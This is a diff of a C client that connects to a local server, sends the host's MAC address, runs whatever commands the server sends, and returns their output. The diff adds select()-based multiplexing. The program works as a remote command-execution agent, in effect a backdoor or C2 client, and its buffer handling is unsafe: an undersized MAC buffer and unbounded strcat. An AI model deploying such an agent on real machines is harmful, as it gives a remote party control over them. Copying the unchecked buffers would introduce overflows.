@@ -11,10 +11,11 @@
 #include "client_functions.h"
 int main() {
   const int MSG_SIZE = 4096;
-  const uint16_t MYPORT = 7400;
+  const int MYPORT = 7400;
   const char HOSTNAME[] = "127.0.0.1";
-  const int ADDR_SIZE = 12;
   /* Create a socket for the client */
+  char fd_array[150];
+  fd_set readfds, testfds, clientfds;
 
   int sockfd = open_tcp_socket();
 
@@ -26,15 +27,17 @@ int main() {
 
   struct sockaddr_in serv_addr = {
       .sin_family = AF_INET,
-      .sin_port = htons(MYPORT),
+      .sin_port = (in_port_t)htons(MYPORT),
       .sin_addr = *(struct in_addr*)*server->h_addr_list,
   };
 
   printf("Trying to connect to %s \n", HOSTNAME);
   try_connect(sockfd, serv_addr);
-  if (fflush(stdout) == EOF) {
-    error_and_exit("Error flushing stdout");
-  }
+  fflush(stdout);
+  FD_ZERO(&clientfds);
+  FD_SET(sockfd, &clientfds);
+  FD_SET(0, &clientfds);
+
   printf("Connected to server.\n");
   char msg[MSG_SIZE];
   char output_buffer[MSG_SIZE];  // Adjust buffer size as needed
@@ -42,7 +45,7 @@ int main() {
 
   // Send MAC Address Once
   char* wl_interface = find_devices("/sys/class/net");
-  char mac_addr[ADDR_SIZE];
+  char mac_addr[12];
   if (mac_address(wl_interface, mac_addr) == -1) {
     printf("Failed to get MAC Address");
   }
@@ -53,30 +56,32 @@ int main() {
   }
 
   while (1) {
+    testfds = clientfds;
+    select(FD_SETSIZE, &testfds, NULL, NULL, NULL);
     for (int fd = 0; fd < FD_SETSIZE; fd++) {
-      // Process the received message here (e.g., execute commands)
-      FILE* output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
-      memset(result_buffer, 0,
-             strlen(result_buffer));  // clear result_buffer
-      // Read the output of the command and send it back to the server
-      while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
-        strcat(result_buffer,
-               output_buffer);  // Append each line to the result buffer
-      }
+      if (FD_ISSET(fd, &testfds) && fd == sockfd) {
+        // Process the received message here (e.g., execute commands)
+        FILE* output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
+        memset(result_buffer, 0,
+               strlen(result_buffer));  // clear result_buffer
+        // Read the output of the command and send it back to the server
+        while (fgets(output_buffer, sizeof(output_buffer), output_pipe) !=
+               NULL) {
+          strcat(result_buffer,
+                 output_buffer);  // Append each line to the result buffer
+        }
 
-      printf("%s \n", result_buffer);
+        printf("%s \n", result_buffer);
 
-      // Send the result buffer back to the server
-      if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
+        // Send the result buffer back to the server
+        if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
+          pclose(output_pipe);
+          close(sockfd);
+          error_and_exit("Error sending response to server\n");
+        }
+        fflush(stdout);  // Ensure the data is sent immediately
         pclose(output_pipe);
-        close(sockfd);
-        error_and_exit("Error sending response to server\n");
       }
-
-      if (fflush(stdout) == EOF) {
-        error_and_exit("Error flushing stdout");
-      }
-      pclose(output_pipe);
     }
   }
   /* Close the socket */
